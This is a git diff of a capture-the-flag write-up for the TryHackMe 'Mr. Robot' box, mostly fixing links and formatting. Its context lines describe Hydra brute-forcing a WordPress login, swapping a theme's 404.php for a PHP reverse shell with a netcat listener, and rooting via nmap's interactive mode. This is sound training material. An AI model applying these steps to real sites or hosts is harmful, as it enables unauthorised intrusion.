@@ -1,4 +1,4 @@
-# Write Up for Try_Hack_Me box - [Mr. Robot CTF](https://tryhackme.com/room/mrrobot)
+# Write Up for Try Hack Me box - [Mr. Robot CTF](https://tryhackme.com/room/mrrobot)
 
 This box was first put on VulnHub.com and is a relatively easy box.\
 The box is based around the show Mr. Robot and is a boot-to-root type with aim to find the three hidden flags.
@@ -9,20 +9,20 @@ The box is based around the show Mr. Robot and is a boot-to-root type with aim t
 
 **Enumeration**
 \
-[nmap](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/Write_Up.md#services-enumeration) \
-[wpscan](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/Write_Up.md#web-reconnaissance) \
-[LinPeas](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/Write_Up.md#privilege-escalation) 
+[nmap](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/Write_Up.md#services-enumeration) \
+[wpscan](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/Write_Up.md#web-reconnaissance) \
+[LinPeas](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/Write_Up.md#privilege-escalation) 
 
 **Brute Forcing**
 \
-[GoBuster](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/Write_Up.md#web-reconnaissance) \
-[Hydra](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/Write_Up.md#hydra) 
+[GoBuster](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/Write_Up.md#web-reconnaissance) \
+[Hydra](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/Write_Up.md#hydra) 
 
 So, without wasting anymore time, lets just jump right in and start with enumerating services running on the box.
 
 ## Services Enumeration
 
-1. Ran a quick scan for all ports usinng nmap. Nmap is the most widely used tool for services enumeration. If it was a local box, we could have used _netdiscover_ to obtain the IP of the box.
+1. Ran a quick scan for all ports using nmap. Nmap is the most widely used tool for services enumeration. If it was a local box, we could have used _netdiscover_ to obtain the IP of the box.
 
 **Output**
 
@@ -93,13 +93,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 ## Web Reconnaissance
 
 1. We go and check out the website hosted at the port 80.
-
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/web_home_80.png)
+\
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/web_home_80.png)
+\
 
 2. We can explore the 6 options presented to us at the main page. You don't get anything useful from visiting them unless you want to join Mr. Robot on his mission!! We also visit the website hosted on the port 443. We see that it just the ssl version of the website on port 80. **We also don't find any information leak from the certificate.** \
 So, let us start with some manual enumeration while we run the gobuster in the background. Checking the **robots.txt** file. We find that there are two files that are prohibited for all User-Agents. 
-
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/robots.png)
+\
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/robots.png)
 \
 fsocity.dic - It is a tailored wordlist. Possible fuzzable parameters and can be stored for later. We can remove the duplicacy by using _sort -u_.  
 
@@ -111,13 +112,13 @@ fsocity.dic - It is a tailored wordlist. Possible fuzzable parameters and can be
 **/key-1-of-3.txt link - If we visit this link, we find us the first key. Submit it.** 
 
 3. Checking the page source for the main page, we get an easter egg.
-
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/80_src.png)
+\
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/80_src.png)
 \   
 Lastly, we can check for the what are the acceptable extensions for the files. Thus, we understand that it is a php web server. This allows us to tailor the malicious payloads that we can upload.\
 _.php_ loads perfectly  while other extensions like _.html_ go in an infinite loop. This means that php files are acceptable. We can inject malicious php scripts later.
-
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/valid_ext_php.png)
+\
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/valid_ext_php.png)
 \
 Let's look at the results that came back from gobuster now. We included the -x option for php extension which we enumerated earlier.\
 The standard command is as follows with options as\
@@ -167,15 +168,15 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ```
 
 We see that there are few other easter eggs when you try to find out the documents that usually contain information such as version or release date. readme is such an example. I leave the rest up to you to find.
-
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/readme_dir.png)
-
+\
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/readme_dir.png)
+\
 
 4. The other peculiar thing is that most of the other pages like /image are **Forbidden** and others lead to the standard _/wp-login_ page. It ensures that to move further we need _valid credentials_ to login into the wordpress site.
-
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/forbidden.png)
 \
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/login_dir_302_wp-login.png)
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/forbidden.png)
+\
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/login_dir_302_wp-login.png)
 \
 As this is a wordpress site, we can launch a *wpscan* in the background. Always good to have some enumeration running in the background. Rabbit holes are deep man!! Don't fall too deep in them.\
 We are doing an aggressive search for possible plugins, themes and databases.\
@@ -189,12 +190,12 @@ $ wpscan -v -e ap,at,cb --url http://10.10.87.211/
 ## HYDRA
 
 1. We can use any fuzzer available such as _wfuzz, hydra and patator_. One can choose any one of the following for this purpose. We would need the _http-post-form_ option as this wp-login is a post form as seen in the burp intercept.
-
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/burp.png)
+\
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/burp.png)
 \
 Let's enumerate the user first. We see that an **invalid user** can be distingused by the reflective response. We can include this in our hydra search.
-
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/invalid_usr.png)
+\
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/invalid_usr.png)
 \
 Let's run hydra now!! The various options are\
 *-T* : Threads. Default set to 16. One can increase it to reduce fuzz time. I set it to 100.\
@@ -238,15 +239,17 @@ We find valid credentials. We can now login using this.
 ## WORDPRESS & REVERSE SHELL
 
 1. We are greeted with a standard _/wp-admin_ page. We will move around and see if we find something that can get us a shell.
-
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/wp_admin.png)
+\
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/wp_admin.png)
 \
 We see that the various php templates of the various _Themes_ in the _Appearance_ section are mutable. On the other hand the _wpscan enumeration__ finds us that these files can then be invoked from going to /wp-content/themes/$THEME_NAME/$PHP_FILE. Enumeration for the win!! \
 Note: One can also modify the _Plugin_ section and achieve the reverse shell. I'll leave the work to you. 
-
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/404_php.png)
 \
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/404_php.png)
+\
+
 **WPSCAN OUTPUT**
+
 ```bash
 [32m[+][0m Checking Theme Versions (via Passive and Aggressive Methods)
 [34m[i][0m Theme(s) Identified:
@@ -260,11 +263,9 @@ Note: One can also modify the _Plugin_ section and achieve the reverse shell. I'
  | Style URI: https://wordpress.org/themes/twentyfifteen/
  | Text Domain: twentyfifteen
 ```
-
 We can now replace contents of a file like _404.php_ with reverse shell code. We start a listner on our side and invoke the modified file. \
-I am using standard php reverse shell script from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to replace the content of the 404.php page. The only thing to change is the _IP and PORT_ on which you are listening. A person just starting out will find all the scripts rather useful.\
+I am using standard php reverse shell script from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) to replace the content of the 404.php page. The only thing to change is the _IP and PORT_ on which you are listening. A person just starting out will find all the scripts rather useful.
 \
-**SCRIPT**
 
 ```php
 	<?php
@@ -398,8 +399,8 @@ $ nc -lnvvp 5555
 listening on [any] 5555 ...
 ```
 We get a blank page and also reverse shell on our listener. The page is still loading as it is waiting for our shell process to die.
-
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/rev_shell_req.png)
+\
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/rev_shell_req.png)
 \
 **REVERSE SHELL**
 
@@ -574,9 +575,9 @@ drwxr-xr-x 14 root  root     480 Nov 13 02:15 ..
 ```
 
 3. So, to exploit this let us visit to __GTFOBINS__(https://gtfobins.github.io/) which provide us with Unix binaries' expoits to bypass system security. We can search for _nmap_.
-
-![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Mr.%20Robot/images/sudo.png)
-
+\
+![](https://github.com/pratty010/Boxes/blob/master/Try%20Hack%20Me/Medium/Mr.%20Robot/images/sudo.png)
+\
 4. So, let's now use take advantage of the nmap's interactive mode and privesc to root. We find the last key in the /root directory. **We can submit this and mark this box as complete !!**
 
 **Output**
